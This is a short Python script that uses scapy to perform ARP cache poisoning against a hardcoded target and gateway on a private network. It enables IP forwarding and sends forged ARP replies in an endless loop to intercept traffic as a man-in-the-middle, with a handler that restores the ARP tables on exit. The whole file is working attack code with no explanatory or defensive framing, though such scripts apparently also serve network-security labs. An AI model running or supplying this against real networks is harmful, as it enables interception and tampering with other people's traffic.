#!/usr/bin/env python3

from scapy.all import ARP, Ether, srp, send
import signal
import sys
import os
import os

def enable_ip_forwarding():
    os.system("sysctl -w net.ipv4.ip_forward=1")

def restore(target_ip, target_mac, source_ip, source_mac):
    """Restores the ARP table by sending the correct ARP packets."""
    send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac), count=3)
    send(ARP(op=2, pdst=source_ip, hwdst=source_mac, psrc=target_ip, hwsrc=target_mac), count=3)

def arp_poison(target_ip, target_mac, spoof_ip):
    """Sends fake ARP responses to poison the target's ARP cache."""
    poison = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(poison, verbose=False)

def signal_handler(sig, frame):
    print("\nRestoring ARP tables...")
    restore(target_ip, target_mac, gateway_ip, gateway_mac)
    sys.exit(0)

def get_mac(ip):
    """Returns the MAC address for a given IP."""
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = srp(arp_request_broadcast, timeout=2, verbose=False)[0]
    return answered_list[0][1].hwsrc if answered_list else None

if __name__ == "__main__":
    enable_ip_forwarding()
    target_ip = "192.168.1.20"
    target_mac = get_mac(target_ip)
    gateway_ip = "192.168.1.10"
    gateway_mac = get_mac(gateway_ip)

    print("Starting ARP poisoning...")
    signal.signal(signal.SIGINT, signal_handler)

    while True:
        arp_poison(target_ip, target_mac, gateway_ip)
        arp_poison(gateway_ip, gateway_mac, target_ip)
